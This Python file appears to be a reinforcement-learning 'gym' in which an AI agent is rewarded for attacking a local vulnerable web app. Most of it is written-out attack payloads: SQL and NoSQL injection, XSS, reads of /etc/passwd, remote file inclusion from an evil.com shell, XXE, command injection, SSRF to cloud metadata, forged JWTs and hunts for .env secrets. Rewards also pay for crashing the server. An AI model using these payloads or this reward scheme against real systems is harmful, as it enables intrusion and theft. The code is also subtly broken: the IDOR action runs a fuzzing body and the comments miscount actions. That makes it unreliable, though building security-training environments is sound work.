"""
The Web Security Gym
====================

This is the "Virtual World" where our AI Agent lives and trains.
It simulates a web browser interacting with a vulnerable website.

Concepts:
- Environment: The world (the website).
- Agent: The player (our AI).
- Action: What the player does (click link, inject SQL).
- Observation: What the player sees (page content, status code).
- Reward: Points for doing good things (finding bugs) or bad things (crashing).
"""

import gymnasium as gym
from gymnasium import spaces
import numpy as np
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from typing import Tuple, Dict, Any
import time
import re
from agent.payload_manager import PayloadManager

class WebSecurityGym(gym.Env):
    """
    The Gymnasium Environment for Web Security.
    Think of this as the game engine.
    """
    
    def __init__(self, target_url: str = "http://localhost:5000"):
        super(WebSecurityGym, self).__init__()
        self.target_url = target_url
        
        # The Arsenal: Tools the agent can use
        self.payload_manager = PayloadManager()
        
        # Actions: The agent now has 45 possible moves (OWASP Top 10 2025 Complete)
        # 0-5: Navigation
        # 6-15: SQL Injection (Classic, Blind, Time-based, JSON, NoSQL)
        # 16-22: XSS (Reflected, Stored, DOM, Polyglot, CSP Bypass)
        # 23-27: File Inclusion (LFI, RFI, Path Traversal, XXE)
        # 28-32: SSRF & CSRF
        # 33-37: Authentication & Authorization (JWT, OAuth, IDOR, BAC)
        # 38-42: Deserialization, Business Logic, Race Conditions
        # 43-45: Utility actions & File Upload
        # 46-47: OSINT Skills
        self.action_space = spaces.Discrete(48)
        
        # Observations: The agent sees 10 features about the current page
        # 1. Current Page ID
        # 2. HTTP Status Code (200, 404, 500, etc.)
        # 3. Vulnerability Detected? (Yes/No)
        # 4. Sensitive Data Seen? (Yes/No)
        # 5. WAF Triggered? (Yes/No)
        # 6. Rate Limited? (Yes/No)
        # 7. Logged In? (Yes/No)
        # 8. Response Time (How fast did the server reply?)
        # 9. Content Variance (Did the page change unexpectedly?)
        # 10. Input Count (How many forms/inputs are there?)
        # 11. Business Context (Is this a money/admin page?)
        self.observation_space = spaces.Box(low=0, high=5, shape=(11,), dtype=np.float32)
        
        # Setup the "Browser" (HTTP Session)
        self._setup_browser_session()
        
        # Game State Variables
        self.current_page_id: int = 0
        self.found_vulnerability: int = 0
        self.found_sensitive_data: int = 0
        self.triggered_waf: int = 0
        self.got_rate_limited: int = 0
        self.auth_token: str = None
        
        # Metrics for "Senses"
        self.last_response_time: float = 0.0
        self.content_variance: float = 0.0
        self.input_count: int = 0
        self.baseline_page_size: int = 0
        
        # PENTESTER MODE: Longer episodes for full exploration
        self.max_steps_per_episode: int = 100
        self.steps_taken: int = 0
        
        # Map Action IDs to Functions - OWASP Top 10 2025 Complete
        self.action_book = {
            # Navigation (0-5)
            0: self.navigate_home,
            1: self.navigate_login,
            2: self.navigate_search,
            3: self.navigate_post,
            4: self.navigate_profile,
            5: self.navigate_api_docs,
            
            # SQL Injection (6-15) - A05: Injection
            6: self.attack_sqli_classic,
            7: self.attack_sqli_union,
            8: self.attack_sqli_time_based,
            9: self.attack_sqli_blind,
            10: self.attack_sqli_json,
            11: self.attack_sqli_api_login,
            12: self.attack_nosql_injection,
            13: self.attack_graphql_injection,
            14: self.attack_ldap_injection,
            15: self.attack_sqli_waf_bypass,
            
            # XSS (16-22) - A05: Injection
            16: self.attack_xss_reflected,
            17: self.attack_xss_stored,
            18: self.attack_xss_dom,
            19: self.attack_xss_polyglot,
            20: self.attack_xss_csp_bypass,
            21: self.attack_xss_api_comment,
            22: self.attack_ssti,
            
            # File Inclusion & XXE (23-27) - A05: Injection
            23: self.attack_lfi,
            24: self.attack_rfi,
            25: self.attack_path_traversal,
            26: self.attack_xxe,
            27: self.attack_command_injection,
            
            # SSRF & CSRF (28-32) - A10: SSRF
            28: self.attack_ssrf_internal,
            29: self.attack_ssrf_cloud_metadata,
            30: self.attack_ssrf_preview,
            31: self.attack_csrf_transfer,
            32: self.attack_open_redirect,
            
            # Authentication & Authorization (33-37) - A01, A07
            33: self.attack_jwt_none_algorithm,
            34: self.attack_oauth_bypass,
            35: self.attack_idor_profile,
            36: self.attack_bac_admin_users,
            37: self.attack_session_fixation,
            
            # Advanced Attacks (38-42) - A06, A08
            38: self.attack_deserialization,
            39: self.attack_business_logic,
            40: self.attack_race_condition,
            41: self.attack_mass_assignment,
            42: self.attack_prototype_pollution,
            
            # Utility Actions (43-44)
            43: self.action_login_valid,
            44: self.action_wait,
            
            # New Actions (45)
            45: self.attack_file_upload,
            
            # OSINT Skills (46-47)
            46: self.attack_osint_files,
            47: self.attack_osint_fingerprint,
        }
    
    def _setup_browser_session(self) -> None:
        """Configures the HTTP client to be fast and reliable."""
        self.session = requests.Session()
        
        # Retry if the server hiccups
        retry_strategy = Retry(
            total=2,
            backoff_factor=0.1,
            status_forcelist=[500, 502, 503, 504]
        )
        
        # Use connection pooling (keep the line open)
        adapter = HTTPAdapter(
            pool_connections=5,
            pool_maxsize=10,
            max_retries=retry_strategy
        )
        
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
    
    def reset(self, seed: int = None, options: Dict = None) -> Tuple[np.ndarray, Dict]:
        """Resets the game to the beginning."""
        super().reset(seed=seed)
        self.current_page_id = 0
        self.found_vulnerability = 0
        self.found_sensitive_data = 0
        self.triggered_waf = 0
        self.got_rate_limited = 0
        self.auth_token = None
        self.steps_taken = 0
        
        self.last_response_time = 0.0
        self.content_variance = 0.0
        self.input_count = 0
        self.baseline_page_size = 0
        self.business_context = 0 # Initialize to 0 (Neutral)
        
        # Clear cookies and headers (Logout)
        self.session.cookies.clear()
        self.session.headers.pop('Authorization', None)
        
        # PENTESTER MODE: Reset Tracking
        self.discovered_vulns = set()
        self.visited_pages = set()
        self.visited_pages.add(0) # Start at home
        
        return self._get_observation(), {}
    
    def step(self, action_id: int) -> Tuple[np.ndarray, float, bool, bool, Dict]:
        """
        The Agent takes one step (performs one action).
        Returns: (New State, Reward, Game Over?, Truncated?, Info)
        """
        self.steps_taken += 1
        reward = -1.0  # Small penalty for each step (encourages speed)
        game_over = False
        truncated = False
        info = {}
        
        # Reset temporary flags
        self.triggered_waf = 0
        self.got_rate_limited = 0
        self.found_vulnerability = 0 
        
        start_time = time.time()
        response = None
        
        try:
            # 1. Perform the Action
            action_function = self.action_book.get(action_id)
            if action_function:
                action_name = action_function.__name__
                
                # Execute action
                response, action_reward = action_function()
                reward += action_reward
                
                # PENTESTER MODE: Coverage Reward
                # If we moved to a new page, get bonus points
                if response:
                    reward += self._update_coverage(self.current_page_id)
                
                # LOGGING FOR USER
                status = response.status_code if response else "None"
                url = response.url if response else "N/A"
                
                # Try to extract payload from request body/params for display
                payload_info = ""
                if response:
                    info['url'] = response.url
                    info['method'] = response.request.method
                    
                    if response.request.body:
                        info['payload'] = str(response.request.body)
                        payload_info = f" | Body: {str(response.request.body)[:50]}..."
                    elif '?' in response.url:
                        info['payload'] = response.url.split('?', 1)[1]
                        if 'q=' in response.url:
                            payload_info = f" | Query: {response.url.split('q=')[1][:50]}..."
                    else:
                        info['payload'] = ""
                
                print(f"Action: {action_name:<25} | Status: {status:<3} | Reward: {action_reward:>5.1f} | URL: {url[-40:]:<40}{payload_info}")
            else:
                response = None
                
        except requests.exceptions.RequestException:
            # If the server crashes or connection fails
            return self._get_observation(500), -10.0, True, False, {}
        
        # 2. Analyze the Result
        end_time = time.time()
        self.last_response_time = end_time - start_time
        
        if response:
            self._analyze_response_content(response)
        
        # 3. Check Game Over conditions
        if self.steps_taken >= self.max_steps_per_episode:
            truncated = True
        
        status_code = response.status_code if response else 500
        return self._get_observation(status_code), reward, game_over, truncated, info
    
    def _analyze_response_content(self, response):
        """Looks at the page content to update our 'senses'."""
        content_len = len(response.text)
        
        # Establish baseline size for this page if new
        if self.baseline_page_size == 0:
            self.baseline_page_size = content_len
        
        # Calculate how much the page changed (Variance)
        # High variance might mean we broke something or revealed hidden data
        diff = abs(content_len - self.baseline_page_size)
        self.content_variance = min(diff / (self.baseline_page_size + 1) * 5, 5.0)
        
        # Update baseline (moving average)
        self.baseline_page_size = int(0.9 * self.baseline_page_size + 0.1 * content_len)
        
        # Count inputs (Attack Surface)
        self.input_count = response.text.count('<input') + response.text.count('name=')
        
        # BUSINESS LOGIC AWARENESS
        # Detects if the page deals with money, quantities, or roles
        keywords = ['price', 'balance', 'amount', 'quantity', 'total', 'cart', 'admin', 'role']
        self.business_context = 1 if any(k in response.text.lower() for k in keywords) else 0

    def _get_observation(self, status_code: int = 200) -> np.ndarray:
        """
        Compiles what the agent sees into a list of numbers (Vector).
        """
        # Simplify status codes for the AI
        # 0=OK, 2=Forbidden, 3=RateLimit, 4=NotFound, 5=Error, 6=Unauthorized
        status_map = {200: 0, 403: 2, 429: 3, 404: 4, 500: 5, 401: 6}
        status_val = status_map.get(status_code, 1)
        
        is_logged_in = 1 if self.auth_token else 0
        
        # Normalize values to be small numbers (0-5) for the Neural Network
        time_norm = min(self.last_response_time, 5.0)
        inputs_norm = min(self.input_count, 5.0)
        
        return np.array([
            self.current_page_id,
            status_val,
            self.found_vulnerability,
            self.found_sensitive_data,
            self.triggered_waf,
            self.got_rate_limited,
            is_logged_in,
            time_norm,
            self.content_variance,
            inputs_norm,
            self.business_context # New Feature (11th dimension)
        ], dtype=np.float32)
    
    # --- ACTIONS: NAVIGATION ---
    
    def navigate_home(self) -> Tuple[requests.Response, float]:
        """Go to Home Page"""
        r = self.session.get(f"{self.target_url}/", timeout=3)
        self.current_page_id = 0
        return r, 0.0
    
    def navigate_login(self) -> Tuple[requests.Response, float]:
        """Go to Login Page"""
        r = self.session.get(f"{self.target_url}/login", timeout=3)
        self.current_page_id = 1
        return r, 0.0
    
    def navigate_search(self) -> Tuple[requests.Response, float]:
        """Go to Search Page"""
        r = self.session.get(f"{self.target_url}/search", timeout=3)
        self.current_page_id = 2
        return r, 0.0
    
    def navigate_post(self) -> Tuple[requests.Response, float]:
        """View a Blog Post"""
        r = self.session.get(f"{self.target_url}/post/1", timeout=3)
        self.current_page_id = 3
        return r, 0.0
    
    def navigate_profile(self) -> Tuple[requests.Response, float]:
        """Go to User Profile"""
        r = self.session.get(f"{self.target_url}/profile", timeout=3)
        self.current_page_id = 4
        return r, 0.0
    
    # --- ACTIONS: ATTACKS ---
    
    def action_login_valid(self) -> Tuple[requests.Response, float]:
        """Legitimately log in to get an access token."""
        r = self.session.post(
            f"{self.target_url}/api/v1/auth/gate_keeper_99",
            json={"username": "admin", "password": "secure_password_123"},
            timeout=3
        )
        if r.status_code == 200 and 'auth_token_v2' in r.json():
            self.auth_token = r.json()['auth_token_v2']
            self.session.headers['Authorization'] = f"Bearer {self.auth_token}"
            return r, 10.0 # Small reward for getting access
        return r, 0.0

    def attack_sqli_api_login(self) -> Tuple[requests.Response, float]:
        """Try SQL Injection on the Login API."""
        payload = self.payload_manager.get_sqli("simple")
        r = self.session.post(
            f"{self.target_url}/api/v1/auth/gate_keeper_99",
            json={"username": f"admin{payload}", "password": "x"},
            timeout=3
        )
        reward = self._calculate_reward(r, "SQL_API")
        
        # If successful, save the token
        if r.status_code == 200 and 'auth_token_v2' in r.json():
            self.auth_token = r.json()['auth_token_v2']
            self.session.headers['Authorization'] = f"Bearer {self.auth_token}"
            
        return r, reward
    
    def attack_xss_api_comment(self) -> Tuple[requests.Response, float]:
        """Try Stored XSS on the Comment API."""
        if not self.auth_token:
            self.action_login_valid()
            
        payload = self.payload_manager.get_xss("simple")
        r = self.session.post(
            f"{self.target_url}/api/v1/interact/comment_x",
            json={"payload": payload, "target_id": 1},
            timeout=3
        )
        reward = self._calculate_reward(r, "XSS_API")
        return r, reward

    def attack_bac_admin_users(self) -> Tuple[requests.Response, float]:
        """Try to access the Admin User Database (Broken Access Control)."""
        if not self.auth_token:
            self.action_login_valid()
            
        r = self.session.get(f"{self.target_url}/api/internal/sys_admin/users_db_dump", timeout=3)
        reward = self._calculate_reward(r, "BAC_API")
        return r, reward

    def attack_idor_profile(self) -> Tuple[requests.Response, float]:
        """Try IDOR (Insecure Direct Object Reference) on Profile."""
        if not self.auth_token:
             self.action_login_valid()
        """Send random garbage data to see if the server crashes."""
        payload = self.payload_manager.get_fuzz()
        r = self.session.get(f"{self.target_url}/search?q={payload}", timeout=3)
        
        # Reward for causing 500 errors (Server Crash)
        if r.status_code == 500:
            return r, 20.0
        return r, 0.0

    def attack_sqli_time_based(self) -> Tuple[requests.Response, float]:
        """Try Time-Based SQL Injection (make the database sleep)."""
        payload = self.payload_manager.get_sqli("time")
        start = time.time()
        r = self.session.post(
            f"{self.target_url}/api/v1/auth/gate_keeper_99",
            json={"username": f"admin{payload}", "password": "x"},
            timeout=10 
        )
        # In a real scenario, we'd check if (end - start) > 5 seconds
        reward = self._calculate_reward(r, "SQL_API")
        return r, reward

    def attack_xss_polyglot(self) -> Tuple[requests.Response, float]:
        """Try a complex XSS payload that works in many contexts."""
        payload = self.payload_manager.get_xss("polyglot")
        r = self.session.get(
            f"{self.target_url}/search?q={payload}",
            timeout=3
        )
        reward = self._calculate_reward(r, "XSS_REFLECTED")
        return r, reward
    
    # ========================================================================
    # NEW OWASP TOP 10 2025 ATTACK METHODS
    # ========================================================================
    
    # Navigation Methods
    def navigate_api_docs(self) -> Tuple[requests.Response, float]:
        """Navigate to API documentation."""
        r = self.session.get(f"{self.target_url}/swagger", timeout=3)
        return r, 0.0
    
    # SQL Injection Variants
    def attack_sqli_classic(self) -> Tuple[requests.Response, float]:
        """Classic SQL Injection."""
        payload = self.payload_manager.get_sqli("simple")
        r = self.session.get(f"{self.target_url}/search?q={payload}", timeout=3)
        return r, self._calculate_reward(r, "SQL_SEARCH")
    
    def attack_sqli_union(self) -> Tuple[requests.Response, float]:
        """UNION-based SQL Injection."""
        r = self.session.get(f"{self.target_url}/search?q=' UNION SELECT 1,2,3--", timeout=3)
        return r, self._calculate_reward(r, "SQL_UNION")
    
    def attack_sqli_blind(self) -> Tuple[requests.Response, float]:
        """Blind SQL Injection."""
        r = self.session.get(f"{self.target_url}/search?q=' AND 1=1--", timeout=3)
        return r, self._calculate_reward(r, "SQL_BLIND")
    
    def attack_sqli_json(self) -> Tuple[requests.Response, float]:
        """JSON-based SQL Injection (WAF bypass)."""
        payload = self.payload_manager.get_sqli("json")
        r = self.session.post(f"{self.target_url}/api/v1/users", json={"username": payload}, timeout=3)
        return r, self._calculate_reward(r, "SQL_JSON")
    
    def attack_nosql_injection(self) -> Tuple[requests.Response, float]:
        """NoSQL Injection."""
        r = self.session.post(f"{self.target_url}/nosql_login", 
                             json={"username": {"$ne": None}, "password": {"$ne": None}}, timeout=3)
        return r, self._calculate_reward(r, "NOSQL")
    
    def attack_graphql_injection(self) -> Tuple[requests.Response, float]:
        """GraphQL Injection."""
        r = self.session.post(f"{self.target_url}/graphql", 
                             json={"query": "{ user(id: 1' OR '1'='1) { username } }"}, timeout=3)
        return r, self._calculate_reward(r, "GRAPHQL")
    
    def attack_ldap_injection(self) -> Tuple[requests.Response, float]:
        """LDAP Injection."""
        r = self.session.get(f"{self.target_url}/ldap_search?username=*)(uid=*))(|(uid=*", timeout=3)
        return r, self._calculate_reward(r, "LDAP")
    
    def attack_sqli_waf_bypass(self) -> Tuple[requests.Response, float]:
        """SQL Injection with WAF bypass techniques."""
        payload = self.payload_manager.get_sqli("bypass")
        r = self.session.get(f"{self.target_url}/search?q={payload}", timeout=3)
        return r, self._calculate_reward(r, "SQL_WAF_BYPASS")
    
    # XSS Variants
    def attack_xss_reflected(self) -> Tuple[requests.Response, float]:
        """Reflected XSS."""
        payload = self.payload_manager.get_xss("simple")
        r = self.session.get(f"{self.target_url}/search?q={payload}", timeout=3)
        return r, self._calculate_reward(r, "XSS_REFLECTED")
    
    def attack_xss_stored(self) -> Tuple[requests.Response, float]:
        """Stored XSS via comment."""
        if not self.auth_token:
            return None, -5.0
        payload = self.payload_manager.get_xss("simple")
        r = self.session.post(f"{self.target_url}/api/v1/interact/comment_x",
                             json={"payload": payload, "target_id": 1},
                             headers={"Authorization": f"Bearer {self.auth_token}"}, timeout=3)
        return r, self._calculate_reward(r, "XSS_STORED")
    
    def attack_xss_dom(self) -> Tuple[requests.Response, float]:
        """DOM-based XSS."""
        r = self.session.get(f"{self.target_url}/#<script>alert(1)</script>", timeout=3)
        return r, self._calculate_reward(r, "XSS_DOM")
    
    def attack_xss_csp_bypass(self) -> Tuple[requests.Response, float]:
        """XSS with CSP bypass."""
        payload = self.payload_manager.get_xss("csp_bypass")
        r = self.session.get(f"{self.target_url}/search?q={payload}", timeout=3)
        return r, self._calculate_reward(r, "XSS_CSP")
    
    def attack_ssti(self) -> Tuple[requests.Response, float]:
        """Server-Side Template Injection."""
        r = self.session.get(f"{self.target_url}/template?name={{{{7*7}}}}", timeout=3)
        return r, self._calculate_reward(r, "SSTI")
    
    # File Inclusion & Command Injection
    def attack_lfi(self) -> Tuple[requests.Response, float]:
        """Local File Inclusion."""
        r = self.session.get(f"{self.target_url}/read_file?file=../../etc/passwd", timeout=3)
        return r, self._calculate_reward(r, "LFI")
    
    def attack_rfi(self) -> Tuple[requests.Response, float]:
        """Remote File Inclusion."""
        r = self.session.get(f"{self.target_url}/include_page?page=http://evil.com/shell.php", timeout=3)
        return r, self._calculate_reward(r, "RFI")
    
    def attack_path_traversal(self) -> Tuple[requests.Response, float]:
        """Path Traversal."""
        r = self.session.get(f"{self.target_url}/download?file=../../../etc/passwd", timeout=3)
        return r, self._calculate_reward(r, "PATH_TRAVERSAL")
    
    def attack_xxe(self) -> Tuple[requests.Response, float]:
        """XML External Entity Injection."""
        xxe_payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
        r = self.session.post(f"{self.target_url}/parse_xml", data=xxe_payload, timeout=3)
        return r, self._calculate_reward(r, "XXE")
    
    def attack_command_injection(self) -> Tuple[requests.Response, float]:
        """Command Injection."""
        r = self.session.post(f"{self.target_url}/ping", json={"host": "localhost; whoami"}, timeout=3)
        return r, self._calculate_reward(r, "COMMAND_INJECTION")
    
    # SSRF & CSRF
    def attack_ssrf_internal(self) -> Tuple[requests.Response, float]:
        """SSRF to access internal network."""
        r = self.session.post(f"{self.target_url}/fetch_url", json={"url": "http://localhost:22"}, timeout=3)
        return r, self._calculate_reward(r, "SSRF_INTERNAL")
    
    def attack_ssrf_cloud_metadata(self) -> Tuple[requests.Response, float]:
        """SSRF to access cloud metadata."""
        r = self.session.post(f"{self.target_url}/fetch_url", 
                             json={"url": "http://169.254.169.254/latest/meta-data/"}, timeout=3)
        return r, self._calculate_reward(r, "SSRF_CLOUD")
    
    def attack_csrf_transfer(self) -> Tuple[requests.Response, float]:
        """CSRF attack on money transfer."""
        r = self.session.post(f"{self.target_url}/transfer_money", 
                             json={"to_user": "attacker", "amount": "1000"}, timeout=3)
        return r, self._calculate_reward(r, "CSRF")
    
    def attack_open_redirect(self) -> Tuple[requests.Response, float]:
        """Open Redirect vulnerability."""
        r = self.session.get(f"{self.target_url}/redirect?url=http://evil.com", timeout=3)
        return r, self._calculate_reward(r, "OPEN_REDIRECT")
    
    # Authentication & Authorization
    def attack_jwt_none_algorithm(self) -> Tuple[requests.Response, float]:
        """JWT None Algorithm bypass."""
        import base64
        header = base64.b64encode(b'{"alg":"none","typ":"JWT"}').decode()
        payload = base64.b64encode(b'{"user":"admin","role":"admin"}').decode()
        fake_token = f"{header}.{payload}."
        r = self.session.get(f"{self.target_url}/profile", 
                            headers={"Authorization": f"Bearer {fake_token}"}, timeout=3)
        return r, self._calculate_reward(r, "JWT_NONE")
    
    def attack_oauth_bypass(self) -> Tuple[requests.Response, float]:
        """OAuth redirect bypass."""
        r = self.session.get(f"{self.target_url}/oauth_callback?redirect_uri=http://evil.com", timeout=3)
        return r, self._calculate_reward(r, "OAUTH_BYPASS")
    
    def attack_session_fixation(self) -> Tuple[requests.Response, float]:
        """Session Fixation attack."""
        r = self.session.get(f"{self.target_url}/set_session?session_id=attacker_session", timeout=3)
        return r, self._calculate_reward(r, "SESSION_FIXATION")
    
    # Advanced Attacks
    def attack_deserialization(self) -> Tuple[requests.Response, float]:
        """Insecure Deserialization."""
        import pickle, base64
        malicious_obj = base64.b64encode(pickle.dumps("test")).decode()
        r = self.session.post(f"{self.target_url}/deserialize", json={"data": malicious_obj}, timeout=3)
        return r, self._calculate_reward(r, "DESERIALIZATION")
    
    def attack_business_logic(self) -> Tuple[requests.Response, float]:
        """Business Logic Flaw (negative quantity)."""
        r = self.session.post(f"{self.target_url}/purchase", json={"product_id": 1, "quantity": -999}, timeout=3)
        return r, self._calculate_reward(r, "BUSINESS_LOGIC")
    
    def attack_race_condition(self) -> Tuple[requests.Response, float]:
        """Race Condition attack."""
        r = self.session.post(f"{self.target_url}/race_condition", json={"user_id": 1, "amount": 100}, timeout=3)
        return r, self._calculate_reward(r, "RACE_CONDITION")
    
    def attack_mass_assignment(self) -> Tuple[requests.Response, float]:
        """Mass Assignment vulnerability."""
        r = self.session.post(f"{self.target_url}/update_profile", 
                             json={"username": "hacker", "is_admin": True, "credit_balance": 999999}, timeout=3)
        return r, self._calculate_reward(r, "MASS_ASSIGNMENT")
    
    def attack_prototype_pollution(self) -> Tuple[requests.Response, float]:
        """Prototype Pollution attack."""
        r = self.session.post(f"{self.target_url}/merge_config", 
                             json={"__proto__": {"isAdmin": True}}, timeout=3)
        return r, self._calculate_reward(r, "PROTOTYPE_POLLUTION")

    def attack_file_upload(self) -> Tuple[requests.Response, float]:
        """Unrestricted File Upload attack."""
        payload = self.payload_manager.get_file_upload()
        files = {'file': (payload['name'], payload['content'])}
        
        # 1. Upload the file
        r = self.session.post(f"{self.target_url}/upload", files=files, timeout=3)
        
        # 2. Verify execution (if successful)
        if r.status_code == 200 and 'path' in r.json():
            uploaded_path = r.json()['path']
            # Try to access the uploaded file
            r_verify = self.session.get(f"{self.target_url}{uploaded_path}", timeout=3)
            
            # If we get the content back, it's a win
            if payload['content'] in r_verify.text:
                return r, 100.0
                
        return r, self._calculate_reward(r, "FILE_UPLOAD")

    def attack_osint_files(self) -> Tuple[requests.Response, float]:
        """OSINT: Scan for sensitive files (.git, .env, etc.)"""
        files = self.payload_manager.get_osint_files()
        target_file = np.random.choice(files)
        r = self.session.get(f"{self.target_url}{target_file}", timeout=3)
        
        # Check if we found something interesting
        if r.status_code == 200:
            if "git" in target_file and "repository" in r.text:
                return r, 50.0 # Found git config
            if "env" in target_file and "SECRET" in r.text:
                return r, 75.0 # Found .env secrets
            return r, 20.0 # Found other file
            
        return r, 0.0

    def attack_osint_fingerprint(self) -> Tuple[requests.Response, float]:
        """OSINT: Fingerprint server technology"""
        r = self.session.get(f"{self.target_url}/server_info", timeout=3)
        
        # Reward for identifying technology
        if r.status_code == 200 and "python" in r.text.lower():
            return r, 15.0
        return r, 0.0

    def action_wait(self) -> Tuple[None, float]:
        """Wait for a moment (to bypass rate limits)."""
        time.sleep(2)
        return None, 5.0  # Small reward for patience
    
    def _calculate_reward(self, response: requests.Response, vuln_type: str) -> float:
        """
        The Judge. Decides how many points the agent gets.
        """
        reward = 0.0
        
        # COMPLEX CHAINING: Combo Multiplier
        # Rewards are multiplied if the agent is in a "High Value" state
        multiplier = 1.0
        
        if self.auth_token:
            multiplier += 0.5 # +50% for being logged in (Authenticated Attack)
            
        if hasattr(self, 'business_context') and self.business_context == 1:
            multiplier += 1.0 # +100% for attacking business logic pages (Money/Admin)
            
        # 1. Penalty: Triggered the Firewall (WAF)
        if response.status_code == 403 and "WAF" in response.text:
            self.triggered_waf = 1
            return -10.0
        
        # 2. Penalty: Got Rate Limited (Too fast)
        if response.status_code == 429:
            self.got_rate_limited = 1
            return -20.0
        
        # 3. Success: Found a Vulnerability!
        # We look for specific "Flags" or indicators in the response
        success_indicators = {
            "SQL_API": ["auth_token_v2", "JWT_MASTER_KEY_FOUND"],
            "XSS_API": ["payload_accepted", "check_the_logs"],
            "XSS_REFLECTED": ["<script>alert(1)</script>", "onerror=alert(1)"],
            "BAC_API": ["DB_LEAK_SUCCESS", "admin", "password"],
            "IDOR": ["IDOR_MASTER", "ID: 1"],
            "SSRF": ["Internal Admin Panel", "AWS_ACCESS_KEY"],
            "FILE_UPLOAD": ["File uploaded successfully", "Unrestricted File Upload"],
            "MASS_ASSIGNMENT": ["credit_balance", "999999"],
            "PROTOTYPE_POLLUTION": ["isAdmin", "true"]
        }
        
        indicators = success_indicators.get(vuln_type, [])
        for indicator in indicators:
            if indicator in response.text:
                # PENTESTER MODE: Diminishing Returns
                # We only give full points for the FIRST time a specific vuln is found
                vuln_id = f"{vuln_type}_{self.current_page_id}"
                
                if vuln_id not in self.discovered_vulns:
                    self.found_vulnerability = 1
                    self.discovered_vulns.add(vuln_id)
                    
                    base_reward = 100.0 # Big points for NEW discovery!
                    
                    # Bonus: Found a CTF Flag
                    if "CTF{" in response.text:
                        self.found_sensitive_data = 1
                        base_reward += 50.0
                    
                    reward = base_reward * multiplier
                else:
                    # We already found this. Small reward to say "Good job, but move on."
                    reward = 1.0 
                
                break
        
        return reward

    def _update_coverage(self, page_id: int):
        """PENTESTER MODE: Track Code Coverage"""
        if page_id not in self.visited_pages:
            self.visited_pages.add(page_id)
            return 5.0 # Reward for exploring a new page
        return 0.0
    
    def close(self) -> None:
        """Clean up resources."""
        if hasattr(self, 'session'):
            self.session.close()
    
    def __del__(self):
        self.close()

# Alias for backward compatibility
WebSecEnv = WebSecurityGym

